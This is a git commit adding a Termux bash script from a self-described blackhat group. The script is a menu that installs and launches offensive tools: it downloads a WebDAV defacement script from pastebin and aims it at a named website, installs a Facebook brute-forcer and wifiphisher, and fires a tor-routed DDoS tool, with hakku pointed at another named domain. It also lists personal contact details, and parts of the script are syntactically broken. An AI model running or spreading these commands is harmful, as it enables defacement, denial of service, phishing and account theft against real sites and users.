9263877fee45caad9f798a4a3bd12e3e60caba26
Mr_XiD <44462886+safri1234@users.noreply.github.com>
2018-12-21 01:50:37 +0700

    Create tamvans.sh

---
+++ tamvans.sh
@@ -0,0 +1,309 @@
+#LU kira ni tools gua reqode punya orang wkwkwkw
+#makanya belajar dulu
+#reqode silahkan
+clear
+#Variables
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+sleep 1
+
+toilet -f standard " MR_XiD " -F gay
+echo "       ***************************************** " | 
+lolcat
+echo "       *           ~D35TR0Y SQUAD~            * " | 
+lolcat
+echo "       * Author   : MR_XiD                  * " | 
+lolcat
+echo "       * No Whatsapp : 083851312460            * " | 
+lolcat
+echo "       * facebook : susu bendera            * " | 
+lolcat
+echo "       * Thanks To : ALL member D35TR0Y SQUAD* " | 
+lolcat
+echo "       * SPECIAL TO        * " | 
+lolcat
+echo "       * MA || CYB3R GHOST || CRUSHER ||MR EXPLOR5 " | 
+lolcat
+echo "       *||  ALL MEMBER TEAM      * " | 
+lolcat
+echo "       ***************************************** " | 
+lolcat
+
+
+sleep 1
+###################################################
+# CTRL + C
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+clear
+sleep 1
+exit
+}
+
+echo ""
+echo ""
+echo $red.     "############################# " 
+echo $white     " # SILAHKAN DI PILIH MAS MAS ^_^# " 
+echo $white    "############################# " 
+echo ""
+echo  $green "1. Deface Webdav" 
+echo "========================================" | lolcat
+echo  $cyan  "2. Install Katolin" 
+echo "========================================" | lolcat
+echo  $blue  "3. Install santet online" 
+echo "========================================" | lolcat
+echo  $green "4. Install Admin-Finder" 
+echo "========================================" | lolcat
+echo  $cyan  "5. Install D-TECT" 
+echo "========================================" | lolcat
+echo  $blue  "6. Install Tuan Badut" 
+echo "========================================" | lolcat
+echo "$blue. "7. install MBF hack Fb"
+echo "========================================" | lolcat
+echo "$cyan "8.WIFIPHISHER"
+echo "========================================" | lolcat
+echo "$blue "9.install Hakku
+echo "========================================" | lolcat
+echo "$green "10.install DDOS TORSHAMMER"
+echo "========================================" | lolcat
+echo "$red "11.info pembuat"
+echo "=======================================" | lolcat
+echo "$blue "12.spesial 500 tool installer"
+echo "=======================================" | lolcat
+echo  "$red  "18+. Keluar" 
+echo "========================================" | lolcat
+echo "$green
+read -p " root@MR_XiD:~#" pil;
+
+case $pil in
+1) clear
+toilet -f standard " MR_XiD " -F gay
+ apt update && apt upgrade
+clear
+apt install python2
+clear
+pip2 install urllib3 chardet certiÚ idna requests
+clear
+ apt install openssl curl
+clear
+ pkg install libcurl
+clear
+ mkdir webdav
+clear
+ cd webdav
+clear
+ wget https://pastebin.com/raw/HnVyQPtR
+clear
+mv HnVyQPtR webdav.py
+clear
+ chmod 777 webdav.py
+clear 
+termux-setup-storage
+clear
+"/data/data/com.termux/Úles/home/webdav
+clear
+
+ cd /sdcard/nama_script.htm ~/webdav
+clear
+ python2 webdav.py (target.cok) (nama sc depes lu)
+clear
+python2 webdav.py http://orders.southeasternfood.com/dep
+clear
+;;
+2) clear
+toilet -f standard "  MR_XiD  " -F gay
+pkg update
+clear
+pkg upgrade
+clear
+pkg install git
+clear
+pkg install python2
+clear
+pkg install nano
+clear
+pkg install gnupg
+clear
+git clone https://github.com/LionSec/katoolin.git
+clear
+ls
+clear
+cd katoolin
+clear
+ls
+clear
+python2 katoolin.py
+nano katoolin.py.
+;;
+3) clear
+toilet -f standard " MR_XiD " -F gay
+ apt update && apt upgrade 
+clear
+  apt install python2 
+clear
+  git clone https://github.com/Gameye98/santet-online 
+clear
+ cd santet-online 
+clear
+ python2 santet.py
+ ;;
+4) clear
+toilet -f standard " MR_XiD " -F gay
+apt update && apt upgrade
+clear
+pkg install python2
+clear
+pkg install git
+clear
+git clone https://github.com/AdheBolo/AdminFinder
+clear
+ls
+clear
+cd AdminFinder
+clear
+chmod 777 AdminFinder.py
+clear
+python2 AdminFinder.py
+;;
+5) clear
+toilet -f standard " MR_XiD " -F gay
+git clone https://github.com/shawarkhanethicalhacker/D-TECT
+cd D-TECT
+clear
+chmod +x d-tect.py
+clear
+python2 d-tect.py
+;;
+6) clear
+toilet -f standard " MR_XiD " -F gay
+apt update && apt upgrade
+clear
+pkg install python python2 vim figlet curl
+clear
+pkg install php
+clear
+pip2 install lolcat
+clear
+pkg install git
+clear
+git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv1
+clear
+cd TOOLSINSTALLERv1
+clear
+chmod +x Tuanb4dut.sh
+clear
+sh Tuanb4dut.sh
+;;
+7)clear
+toilet -f standard " MR_XiD " -F gay
+apt update && apt upgrade
+clear 
+apt install python2
+clear
+apt install git
+clear
+git clone https://github.com/safri1234/fbhackbu
+clear
+cd fbhack
+clear
+python2 mbf.py
+;;
+
+8)clear
+toilet -f standard " MR_XiD " -F gay
+pip install scapy
+clear 
+git clone https://github.com/wifiphisher/wifiphisher.git
+clear 
+cd wifiphisher
+clear
+ python setup.py install
+;;
+9)clear
+toilet -f standard " MR_XiD " -F gay
+apt update && apt upgrade 
+clear
+apt install git
+ clear
+ mkdir vasu
+ clear
+ git clone https://github.com/4shadoww/hakkuframework
+ clear
+ cd hakkuframework
+ clear
+ chmod +x hakku
+ clear 
+ python hakku
+ clear
+ show modules
+ clear
+ use whois
+ clear
+ show options
+ celar
+ set target technicalsagar.in
+clear
+ run
+;;
+10)clear
+toilet -f standard " MR_XiD " -F gay
+ apt-get update
+ clear
+ apt-get install python2
+clear
+ apt-get install tor
+clear
+ apt-get install git
+clear
+ git clone https://github.com/dotfighter/torshammer.git
+clear
+ Tor
+clear
+ cd torshammer
+clear 
+python2 torshammer.py -T -t (website)
+;;
+11)echo
+toilet -f standard " MR_XiD " -F gay
+echo "              [=======================[+]=====================]"|lolcat
+echo "              [  Author :  -------------MR_XiD--------------  ]"
+echo "              [===============================================]"|lolcat
+echo "              [  EMAIL  :    safri4687@gmail.com     ]"
+echo "              [  TEAM   :    D35TR0Y SQUAD                    ]"
+echo "              [  WA     :    083851312460                     ]"
+echo "              [===============================================]"|lolcat
+echo "              [        GUNAKAN TOOLS INI DENGAN BENAR         ]"
+echo "              [=======================[+]=====================]"|lolcat
+echo "              <  D35TR0Y SQUAD | JATIM BLACKHAT.              >"|lolcat
+echo "              |  ELITE MUSLIM CYBER ARMY | PONOROGO CREW        |"|lolcat
+echo "              [===============================================]"|lolcat
+echo "              [=======================[+]=====================]"|lolcat
+echo "              [+]  Mr_XiD| MA | MR EXPLOR5 | CRUSHER.       [+]"|lolcat
+echo "              [===============================================]"|lolcat
+;;
+12)echo "[ini dulu ya gua cape nulis]" | lolcat
+;;
+99) echo "[D35TROY SQUAD]" | lolcat
+echo "ORANG NEWBYE WAJARIN" | lolcat
+echo "W Gans Tq ;v" | lolcat
+echo 'G' | lolcat
+echo 'O' | lolcat
+echo 'O' | lolcat
+echo 'D' | lolcat
+echo 'B' | lolcat
+echo 'Y' | lolcat
+echo 'E' | lolcat
+echo 'No Sistem Is Safe......' | lolcat
+exit
+;;
+
+esac
+done
+done
